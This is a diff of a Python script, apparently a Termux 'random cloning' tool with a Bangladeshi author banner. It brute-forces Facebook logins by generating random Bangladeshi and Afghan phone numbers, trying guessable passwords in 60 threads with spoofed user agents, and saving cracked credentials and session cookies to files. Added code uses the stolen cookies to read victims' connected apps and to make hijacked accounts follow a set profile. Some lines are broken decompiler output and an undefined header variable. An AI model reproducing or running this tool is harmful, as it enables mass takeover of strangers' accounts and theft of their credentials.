@@ -1,13 +1,13 @@
-#............ASIF
+# Facebook: Bd RANBO. BY MAHDI
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoupv
+from bs4 import BeautifulSoup
 import requests as ress
+ma4D1 = open
 from datetime import date
 from datetime import datetime
 from time import sleep
-from os import system as s
 from time import sleep as waktu
 try:
     import requests
@@ -17,171 +17,274 @@ try:
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures bs4==2 > /dev/null')
     os.system('pip install bs4')
-RED = '\033[1;91m'
-WHITE = '\033[1;97m'
-GREEN = '\033[1;32m' 
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-ORANGE = '\033[1;35m'
-P = '\x1b[1;97m' 
-M = '\x1b[1;91m' 
-H = '\x1b[1;92m' 
-K = '\x1b[1;93m' 
-B = '\x1b[1;94m' 
+    
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r[🌺] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[🌺] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
+
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100001244871589', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://mbasic.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+            
+            
+
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.009)
+            
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
 U = '\x1b[1;95m' 
-O = '\x1b[1;96m' 
-N = '\x1b[0m'    
-A = '\x1b[1;90m' 
-BN = '\x1b[1;107m' 
-BBL = '\x1b[1;106m' 
-BP = '\x1b[1;105m' 
-BB = '\x1b[1;104m' 
-BK = '\x1b[1;103m' 
-BH = '\x1b[1;102m' 
-BM = '\x1b[1;101m' 
-BA = '\x1b[1;100m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'
+Mahdi_Hasan = print    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+xr = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+asu = random.choice([m,k,xr,u,b])
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
 now = datetime.now()
 dt_string = now.strftime("%H:%M")
 current = datetime.now()
 ta = current.year
 bu = current.month
 ha = current.day
-today = date.today() 
+today = date.today()
+os.system('xdg-open https://facebook.com/ma4D1')
+
+logo ="""
+
+ .d888888  .d88888b  dP  88888888b 
+d8'    88  88.    "' 88  88        
+88aaaaa88a `Y88888b. 88 a88aaaa    
+88     88        `8b 88  88       
+88     88  d8'   .8P 88  88     
+88     88   Y88888P  dP  dP        
+ \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××\033[1;93m××××××××××××××××××
+ \033[1;93m|\033[1;96m[*] CREATED BY\33[0;m   :\033[1;96mASIF YT                 \033[1;93m|
+ \033[1;93m|\033[1;32m[*] FACEBOK      \033[1;34m YT ASIF                 \033[1;93m|
+ \033[1;93m|\033[1;35m[*] GITHUB       \033[1;35mASIF YT                  \033[1;93m|
+ \033[1;93m|\033[1;36m[*] TOOL STATUS  :\033[1;36m Random Cloning Bd      \033[1;93m|
+ \033[1;93m|\033[1;35m[*] TEAM         :\033[1;35mYT ASIF TERMUX HELPLINE & ID GIFT ZONE \033[1;93m|
+ \033[1;93m|\033[1;36m[*] TOOL VIRSION :\033[1;36m0.0                     \033[1;93m|
+ \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××
+ \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....
+\033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m YT ASIF TERMUX HELPLINE....
+ \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××\033[1;91m"""
+
+
 loop = 0
 oks = []
 cps = []
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
+
+def clear():
+    os.system('clear')
+    Mahdi_Hasan(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+    
+    
 try:
- prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
- open('.prox.txt','w').write(prox)
-except Exception as e:
- print('')
-prox=open('.prox.txt','r').read().splitlines()
+    Mahdi_Hasan('\n\n\033[1;33mLoading asset files ... \033[0;97m')
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:Mahdi_Hasan('\n\033[1;31mNo internet connection ... \033[0;97m')
+#global functions
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        Mahdi_Hasan('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+  
+#User agents
+os.system('xdg-open https://facebook.com/groups/613671023861004/')
+
+ugen2=['Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF']
+ugen=['Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1']
+
+ 
 for xd in range(10000):
-    a='Nokia'
-    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    c=random.randrange(1, 99)
-    d='/GoBrowser/'
-    e='1.6.0.'
-    f=random.randrange(1, 99)
-    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    m='Mozilla/5.0 (Linux; U; Android'
+    a=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    h=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    i=random.randrange(1, 999)
+    h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    a='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    s=random.randrange(73,100)
+    a='0'
+    n=random.randrange(4200,4900)
+    shu=random.randrange(40,150)
+    vo='Mobile Safari/537.36'
+    uaku2=(f'{m} {a}; {h}{d}{i}{h}) {a}{s}.{a}.{n}.{shu} {vo}')
     ugen.append(uaku2)
-os.system('xdg-open https://github.com/Asif-404-CYBER')
-logo = ("""
+def mahdi():
+    os.system('clear')
+    print(logo)
+    os.system('xdg-open https://facebook.com/Oise95')
+    print ('\033[1;93m[1] Bangladashi ID')
+    print ('\033[1;91m[2] India  ID')
+    Mhasan = input('\033[1;0m\nINPUT===>')
+    if Mhasan in['1']:
+        os.system('xdg-open https://facebook.com/Oise95')
+        mahdi_bd()
+    if Mhasan in['2']:
+        mahdi_afg()
+    elif Mhasan:
+        mahdi()    
+# APK CHECK
 
- __   _______      _    ____ ___ _____ 
- \ \ / /_   _|    / \  / ___|_ _|  ___|
-  \ V /  | |     / _ \ \___ \| || |_   
-   | |   | |    / ___ \ ___) | ||  _|  
-   |_|   |_|   /_/   \_\____/___|_|    
-                                       
 
- ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mASIF                       ┃
- ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
- ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
- ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
- ┃ [✓] GITHUB    \033[1;91m: \033[1;92mAsif950                    ┃
- ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mASIF                       ┃
- ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+8801302400111             ┃
- ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
-
-class Main:
-    def __init__(self):
-        self.id = []
-        self.ok = []
-        self.cp = []
-        self.loop = 0
-        os.system("clear")
-        print(logo)
-        print(" [01] Random Number Clone")
-        print(" [02] Random Email Clone ")
-        print(" [00] Exit")
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        Asif =input(" [?] Choose : ")
-        os.system('xdg-open https://facebook.com/groups/termuxteambd/')
-        if Asif in ["1", "01"]:
-            num()
-        if Asif in ["2","02"]:
-            gml()
-        if Asif in [" 0", "00"]:
-            exit()
-        else:
-            exit()
-def num():
+def mahdi_bd():
     user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    Mahdi_Hasan(logo)
+    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
+    Mahdi_Hasan(" ══════════════════════════════════════════")
+    rk1 = '016'
+    rk2 = '017'
+    rk3 = '018'
+    rk4 = '019'
+    code = random.choice([rk1,rk2,rk3,rk4])                      # input(f' [{xr}■{x}] Choose : ')
     os.system('clear')
-    print(logo)
-    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    kode = input(' [?] Enter sim code: ')
-    kodex = ''.join(random.choice(string.digits) for _ in range(2))
-    kod = ''.join(random.choice(string.digits) for _ in range(2))
-    os.system('clear')
-    print(logo)
-    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    limit = int(input(' [?] Crack Limit : '))
+    Mahdi_Hasan(logo)
+    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
-        os.system('clear')
-        print(logo)
+    os.system("clear")
+    Mahdi_Hasan(logo)
+    passx = 0
+    HamiiID = []
+    Mahdi_Hasan("")
+    for bilal in range(passx):
+        pww = input(f"[*] Enter Password {bilal+1} : ")
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=60) as manshera:
+        clear()
         tl = str(len(user))
-        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
-        print(' \033[1;97m[+] Process has been started')
-        print(' \033[1;97m[!] Wait for ids ')
-        print(' \033[1;97m[!] Use flight mode for speed up ')
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        for guru in user:
-            uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
-            yaari.submit(rcrack1,uid,pwx,tl)
-    print(' [+] Crack process has been completed')
-    print(' [+] Ids saved in ok.txt,cp.txt')
+        jalan('\033[1;97m====================================================')
+        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+        jalan('\033[1;97m====================================================')
+        for love in user:
+            pwx = [love[1:],love,love[2:],love+code]
+            uid = code+love
+            for Shuvo in HamiiID:
+                pwx.append(Shuvo)
+                pwx.append(love)
+            manshera.submit(rcrack,uid,pwx,tl)
+    print(f"\n{x} ══════════════════════════════════════════")
 
-def gml():
+
+
+def mahdi_afg():
     user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    Mahdi_Hasan(logo)
+    Mahdi_Hasan(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
+    Mahdi_Hasan(" ══════════════════════════════════════════")
+    rk1 = '9170'
+    rk2 = '9379'
+    rk3 = '9378'
+    rk4 = '9377'
+    rk5 = '9374'
+    code = random.choice([rk1,rk2,rk3,rk4,rk5])                      # input(f' [{xr}■{x}] Choose : ')
     os.system('clear')
-    print(logo)
-    kode = input(' [?] Target fast name : ')
-    os.system('clear')
-    print(logo)
-    kodex = input(' [?] Target last name :  ')
-    os.system('clear')
-    print(logo)
-    print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    doamin = input(' [?] Terget doamin : ')
-    os.system('clear')
-    print(logo)
-    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
-    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    limit = int(input('[?] Crack Limit : '))
+    Mahdi_Hasan(logo)
+    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
+        nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as yaari:
-        os.system('clear')
-        print(logo)
+    os.system("clear")
+    Mahdi_Hasan(logo)
+    passx = 0
+    HamiiID = []
+    Mahdi_Hasan("")
+    for bilal in range(passx):
+        pww = input(f"[*] Enter Password {bilal+1} : ")
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=60) as manshera:
+        clear()
         tl = str(len(user))
-        print(' \033[1;97m[+] Total ids:\033[1;92m '+tl)
-        print(' \033[1;97m[+] Process has been started')
-        print(' \033[1;97m[!] Wait for ids ')
-        print(' \033[1;97m[!] Use flight mode for speed up ')
-        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        for guru in user:
-            uid = kode+kodex+guru+doamin
-            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
-            yaari.submit(rcrack1,uid,pwx,tl)
-    print(' [+] Crack process has been completed')
-    print(' [+] Ids saved in ok.txt,cp.txt')
-def rcrack1(uid,pwx,tl):
+        jalan('\033[1;97m====================================================')
+        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+        jalan('\033[1;97m====================================================')
+        for love in user:
+            pwx = [love[1:],love,love[2:],love+code,'afghan1234','afghan123','afghanistan','100200','500600','800900']
+            uid = code+love
+            for Shuvo in HamiiID:
+                pwx.append(Shuvo)
+                pwx.append(love)
+            manshera.submit(rcrack,uid,pwx,tl)
+    print(f"\n{x} ══════════════════════════════════════════")    
+def rcrack(uid,pwx,tl):
+    #print(user)
     global loop
     global cps
     global oks
@@ -190,9 +293,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mAsif\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
-            sys.stdout.flush()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -203,46 +304,44 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-            'method': 'GET',
-            'scheme': 'https',
-            'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
+            headers = {'authority': 'free.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[Asif-OK] {uid} | {ps}")
-                print(f" Cookie : {coki}")
-                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(uid)
+                print('\r\r\033[1;32m[ASIF-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                cek_apk(session,coki)
+                ma4D1('/sdcard/MDI-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[82:97]
-                print(f"\x1b[38;5;196m[Asif-CP] {cid}|{ps}")
-                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)
+                cid = coki[24:39]
+                print('\r\r\33[1;30m[ASIF-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                ma4D1('/sdcard/mm-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[Asif] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\r%s{x}[{xr}ASIF{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
-Main()
+
+mahdi()
